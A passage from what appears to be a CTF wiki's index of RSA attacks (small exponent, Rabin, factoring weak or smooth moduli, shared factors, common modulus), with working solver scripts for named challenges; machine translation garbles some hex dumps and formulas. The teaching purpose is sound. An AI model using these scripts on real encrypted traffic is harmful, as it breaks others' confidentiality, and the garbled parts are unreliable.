cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) #\u7b97 yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) #\u7b97mp mp and mq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # Calculate a, b, c, d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N D = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 ! = 0 : s = '0' + s print s . decode ( 'hex' ) Get the flag, PCTF{sp3ci4l_rsa} . Title \u00b6","title":"Public Key Index Related Attacks"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#small-public-key-index-attack","text":"","title":"Small public key index attack"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-conditions","text":"e is very small, such as e is 3.","title":"Attack conditions"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-principle","text":"Suppose the user uses the key e=3 e=3 . Considering that the encryption relationship is satisfied: $$ c\\equiv m^3 \\bmod N $$ then: $$ \\begin{align*} m^3 &= c+k\\times N\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} $$ An attacker can enumerate k k from small to large and open three roots in turn until an integer is opened.","title":"Attack principle"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#examples","text":"Here we take the XMan Summer Camp class exercise as an example (Jarvis OJ has a recurrence), the attachment has a flag.enc and pubkey.pem , which is obviously a ciphertext and a public key. Openssl` Read the public key. \u279c Jarvis OJ-Extremely hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 4096 bit ) Modulus: 00 :b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18 : fc: 8c: 7d: 7d: 03 : b8: 2e: 40 : 99 : 51 : c1: 82 : f3: 98 : from: e3: 10 : 45 : 80 : e7: no: 70 : d3: 83 : yes: 53 : 11 : 47 : 56 : 56 :e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db: 0b: 12 : 2c: a4: 0e: 42 : fa: 70 : 91 : 89 : b7: 19 : d7: 46 : E2: F6: 06 : 9b: of: 11 : ce: bd: 65 : 0f: 14 : b9: 3c: 97 : 73 : 52 : fd: 13 : b1: yes: a6: d6: e1: da: 77 : 55 : 02 : ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05 : 68 : 48 : 92 : 84 : e1: 81 : f6, f1: 1E: 27 : 08 : 91 : c8: if : 80 : 01 : 7b: ad: 23 : 8e: 36 : 30 : 39 : a: 10 :1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79 : c7: 52 : 5a: 69 : 98 : 4f: 15 : b5: 66 : 7f: 34 : 20 : eb: 26 : 11 : 36 : 94 : 7f: a1: 23 : e5: 49 : df: ff: 00 : 60 : 18 : 83 : of: D9: 36 : fe: 41 : 1e: 00 : 6e: 4e: 93 : D1: A0: 0b: 0f: ea: 54 : 1b: bf: c8: c5: 18 : 6c: b6: 22 : 05 : 03 : 13 : 11 : 0d: 64 : 0c: 77 : ea: 54 : no: 32 : 20 : fc: 8f: 4c: c6: what: 77 : 15 : 1e: 29 : b3: e0: 65 : 78 : c4: 78 : 45 :89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02 :c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd: 93 : 27 : 06 : 80 : 95 : ef: a0: 10 : b7: f1: 96 : c7: 4b: c3: 7b: 12 : 8f: 9e: 14 : 11 : 75 : 16 : 33 : f7: 8b: 7b: 9e: 56 : f7: 1f: 77 : a1: b4: da: ad: 3f: c5: 4b: 5e: 7e: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08 : d8: the 47 : 36 : ba: 39 : A0: 35 : 44 : 26 : fa: e0: 06 : 7 : fe: 52 : d5: 26 : 7d: cf: b9: c3: 88 : 4f: 51 : fd: df: df: 4a: 97 : 94 : bc: fe: 0e: 15 : 57 : 11 : 37 : 49 : e6: c8: ef: 42 : 1d: You do not know how to do this. 2d: 34 : 88 : f7: 6d: eb: 62 : bd: ef: 7b: ea: 60 : 26 : f2: 2a: 1d: 25 : aa: 2a: 92 : d1: 17 : 4b: 98 : 03 : e6: bb: 5f: ad: 75 : e1: 86 : a9: 46 : a1: 0f: 12 : 43 : f4: 38 : 74 : 46 : cc: this: b2: 22 : 2a: 96 : 5c: c3: 0b:39:29 Exponent: 3 ( 0x3 ) Modulus = B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4 + nlp + jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH + hI + VJ3 / 8AYBiDr9k2 / kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM = -----END PUBLIC KEY----- Seeing e=3 e=3 , it is clear that the small public key index attacked. Here we use the Crypto library to read the public key and use multiprocessing to speed up the crack. #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print ' {:x} ' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE () The blasting time is a bit long, get the flag Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}","title":"Examples"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#title","text":"","title":"Title"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#rsa-derivative-algorithm-rabin-algorithm","text":"","title":"RSA Derivative Algorithm - Rabin Algorithm"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-conditions_1","text":"The Rabin algorithm is characterized by e=2 e=2 .","title":"Attack conditions"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#attack-principle_1","text":"Ciphertext: $$ c = m ^ 2 n way $$ Decryption: Calculate m_p m_p and m_q m_q : $$ \\begin{align*} m_p & = sqrt {c} p \\ way m_q & = sqrt {c} q way \\end{align*} $$ Calculate y_p y_p and y_q y_q with extended Euclidean: $$ y_p \\cdot p + y_q \\cdot q = 1 $$ Solve four plaintexts: $$ \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\ b &= n - a\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\ d &= n - c \\end{align*} $$ Note: If p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 , then $$ \\begin{align*} m_p & c = ^ { frac {1} {4} (p + 1)} p \\ way m_q & c = ^ { frac {1} {4} (q + 1)} q way \\end{align*} $$ In general, p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 is satisfied. For cases that are not met, please refer to the corresponding algorithm.","title":"Attack principle"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#examples_1","text":"Here we take the XMan Summer Camp class exercise (Jarvis OJ has a recurrence) as an example, read the public key. \u279c Jarvis OJ-hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 : c2: 63 : 6a: e5: c3: d8: e4: 3f: fb: 97 : ab: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ / + 5erCQKPGqxsC / bNPXDr yigb / + l / vjDdAgEC -----END PUBLIC KEY----- e=2 e=2 , consider the Rabin algorithm. First, let's break down p and q first. p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 Write code #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # Read public key parameters with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) #\u7b97 yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) #\u7b97mp mp and mq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # Calculate a, b, c, d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N D = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 ! = 0 : s = '0' + s print s . decode ( 'hex' ) Get the flag, PCTF{sp3ci4l_rsa} .","title":"Examples"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#title_1","text":"","title":"Title"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/","text":"Bruteforcing Factors of N \u00b6 Attack Prerequisite \u00b6 N is efficiently small (less than 512 bits, for example). JarvisOJ - Easy RSA \u00b6 Here we take \"JarvisOJ - Easy RSA\" as an example, the challenge description is the following: > Remember the veryeasy RSA? Is it not difficult? Then continue to look at this question, this question is not difficult. > Known piece of RSA encrypted information is: 0xdc2eeeb2782c and the public key used for encryption is known: > N = 322831561921859 and = 23 > Please decrypt the plaintext, please convert the number into ascii code submission when submitting > For example, if the plaintext you solved is 0x6162, please submit the string ab > Submit format: PCTF{clear text string} We can see that our N is small. Here we can query the factors of N manually from factordb : 322831561921859 = 13574881 \\times 23781539 322831561921859 = 13574881 \\times 23781539 But a better solution is to utilize factordb-python for factoring automation: #!/usr/bin/env python3 from Crypto.Util.number import inverse , long_to_bytes from factordb.factordb import FactorDB #--------data--------# N = 322831561921859 e = 23 c = 0xdc2eeeb2782c #--------factordb--------# f = FactorDB ( N ) f . connect () factors = f . get_factor_list () #--------rsa--------# phi = 1 for factor in factors : phi *= factor - 1 d = inverse ( e , phi ) m = pow ( c , d , N ) flag = long_to_bytes ( m ) . decode () print ( flag ) Run the script and grab your flag. p & q Improper decomposition N \u00b6 Attack conditions \u00b6 We can also attack when p and q are not selected properly in RSA. |pq| Very large \u00b6 When pq is large, there must be a certain parameter is small, here we assume p, then we can try to divide the modulus by exhaustive method, and then decompose the modulus, get the confidential parameters and plaintext information. Basically, it is not very feasible. |pq| Smaller \u00b6 First of all \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} \\frac{(p+q)^2}{4}-n=\\frac{(p+q)^2}{4}-pq=\\frac{(p-q)^2}{4} Since |pq| is small, \\frac{(pq)^2}{4} \\frac{(pq)^2}{4} is naturally small, and \\frac{(p+q)^2}{4} \\frac{(p+q)^2}{4} is only slightly larger than N. , so \\frac{p+q}{2} \\frac{p+q}{2} is similar to \\sqrt{n} \\sqrt{n} . Then we can decompose as follows Check each integer x of \\sqrt{n} \\sqrt{n} in sequence until you find an x such that x^2-n x^2-n is the square number, denoted as y^2 y^2 Then x^2-n=y^2 x^2-n=y^2 , and then decompose N according to the squared difference formula p - 1 Smooth \u00b6 When p is a factor of N and p - 1 is smooth, it is possible to use the Pollard's p \u2212 1 algorithm to decompose N, but it is not entirely successful. Warning Principle analysis to be completed p + 1 Smooth \u00b6 When p is a factor of n and p + 1 is smooth, it may be possible to use the Williams's p + 1 algorithm to decompose N, but it is not entirely successful. 2017 SECCON very smooth \u00b6 The program gives an HTTPS encrypted traffic packet, first getting the certificate from it. \u279c 2017_SECCON_verysmooth git: ( master ) binwalk -e s.pcap DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 2292 0x8F4 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 4038 0xFC6 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 5541 0x15A5 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 \u279c 2017_SECCON_verysmooth git: ( master ) ls s.pcap _s.pcap.extracted very_smooth.zip Here are three certificates, three modules are the same, only one example is given here. \u279c _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt -pubkey -text -modulus -noout -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy 8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj DUddp + 4X8C9jtvCaLTgd + baSjo2eB0f + uiSL / 9 / 4NN + vR3FliRm2mByeFCjppTQl yioxCqbXYIMxGO4NcQIDAQAB -----END PUBLIC KEY----- Certificate: Data: Version: 1 (0x0) Serial Number: 11640506567126718943 (0xa18b630c7b3099df) Signature Algorithm: sha256WithRSAEncryption Issuer: C=JP, ST=Kawasaki, O=SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C=JP, ST=Kawasaki, O=SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5: c2: 7b: 67: 03: 5a: ec: 19: 2b: 37: 41: dd: 1f: 4d: 12: 75: 31: b0: 7a: b0: 12: eb: 86: 24: 1c: 09: c0: 81: 49: 9e: 69: ef: 5a: ea: c7: 8d: c6: 23: 0d: 47: 5d: a7: ee: 17: f0: 2f: 63: b6: f0: 9a: 2d: 38: 1d: f9: b6: 92: 8e: 8d: 9e:47: fe: ba: 24: 8b: ff: df: f8: 9c: df: af: 47: 71: 65: 89: 19: b6: 98: 1: 9e: 14: 28: e9: a5: 34: 25: ca: 2a: 31: 0a: a6: d7: 60: 83: 31: 18: in: 0d: 71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78: 92: 11: fb: 6c: e1: 7a: f7: 2a: 33: b8: 8b: 08: a7: f7: 5b: de: cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf: 5b: a7: ee: 8b: 1e: 48: a7: d2: 43: 06: 0e: 4f: 5a: 86: 62: 69: e2: c0: bd: 4e: 89: c9: af: 04: 4a: 77: a2: b7: 39 Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 It can be seen that the modulus is only 1024 bits. Moreover, according to the title name very smooth, it should be one of the factors comparing smooth, here we use the primaryfac to try Pollard's p \u2212 1 and Williams's p + 1 algorithm respectively, as follows \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs -m = p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 : p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 It can be found that when using the Williams's p + 1 algorithm, it is directly decomposed. It is reasonable to say that this factor is p-1 seems to be smoother, but it cannot be decomposed using the Pollard's p \u2212 1 algorithm. Further testing is done here. \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 : 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 Z154 = P1 x P1 x P2 x P3 x P6 x P142 = 2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 : 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 Z154 = P1^185 x P1^62 x P1^97 = 2 ^185 x 3 ^62 x 5 ^97 It can be seen that there are indeed many small factors for p-1, but the number is too large, which will cause an exponential explosion when enumerating, so it is not decomposed. And construct a private key based on the decomposed number from Crypto.PublicKey import RSA import gmpy2 def main (): n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 L q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L e = 65537 L priv = RSA . construct (( n , e , long ( gmpy2 . invert ( e , ( p - 1 ) * ( q - 1 ))))) open ( 'private.pem' , 'w' ) . write ( priv . exportKey ( 'PEM' )) main () Finally, import the private key into wireshark to get the plain text (Edit -> Preferences -> Protocols -> SSL -> RSA Key List). < html > < head >< title > Very smooth </ title ></ head > < body > < h1 > Answer: One of these primes is very smooth. </ h1 > </ body > </ html > Extension \u00b6 For more on some methods of decomposing the modulus N, please refer to https://en.wikipedia.org/wiki/Integer_factorization . Non-coprime Moduli \u00b6 Attack Prerequisite \u00b6 When there are two public keys, N is not mutually prime, we can obviously obtain the greatest common factor directly for these two numbers, and then directly obtain p, q, and then obtain the corresponding private key. SCTF RSA2 \u00b6 Here we take SCTF rsa2 as an example. Open the pcap package directly and find that there are a bunch of messages, including N and e, and then try to test whether the different N is mutual. I tried the first two. import gmpy2 n1 = n2 = print gmpy2 . gcd ( n1 , n2 ) The results found that they were not mutually exclusive. \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py 122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137 Then we can decrypt it directly, here we use the first pair of public key ciphers. code show as below from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = n2 = p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 ! = 0 : plain = '0' + plain print plain . decode ( 'hex' ) Finally decrypted as follows \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py sH1R3_PRlME_1N_rsA_iS_4ulnEra5le Unzip the package. Common Modulus Attack \u00b6 Attack Prerequisite \u00b6 Same modulus N is used multiple times to encrypt the same plaintext m (only e is different for each encryption). e1 and e2 are coprime. Theory \u00b6 Suppose the public exponents of two users are e_1 e_1 and e_2 e_2 , where e_1 e_1 and e_2 e_2 are coprime. If the plaintext m m , then the ciphertext is: c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N Attack could recover the plaintext if he/she obtained c_1 c_1 and c_2 c_2 . Compute the two coefficients r r and s s of re_1+se_2=1\\bmod n re_1+se_2=1\\bmod n using extended Euclidean Algorithm, we have: \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} Jarvis OJ Crypto - very hard RSA \u00b6 Check out the given source code: #!/usr/bin/env python import random N = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929 L def pad_even ( x ): return ( '' , '0' )[ len ( x ) % 2 ] + x e1 = 17 e2 = 65537 fi = open ( 'flag.txt' , 'rb' ) fo1 = open ( 'flag.enc1' , 'wb' ) fo2 = open ( 'flag.enc2' , 'wb' ) data = fi . read () fi . close () while ( len ( data ) < 512 - 11 ): data = chr ( random . randint ( 0 , 255 )) + data data_num = int ( data . encode ( 'hex' ), 16 ) encrypt1 = pow ( data_num , e1 , N ) encrypt2 = pow ( data_num , e2 , N ) fo1 . write ( pad_even ( format ( encrypt1 , 'x' )) . decode ( 'hex' )) fo2 . write ( pad_even ( format ( encrypt2 , 'x' )) . decode ( 'hex' )) fo1 . close () fo2 . close () Take a look at this part: encrypt1 = pow ( data_num , e1 , N ) encrypt2 = pow ( data_num , e2 , N ) We can see that the same modulus N is used twice, and e1 and e2 are coprime. Proceed with common modulus attack: #!/usr/bin/env python3 from Crypto.Util.number import long_to_bytes , bytes_to_long from sympy import gcdex from sys import exit #--------data--------# N = 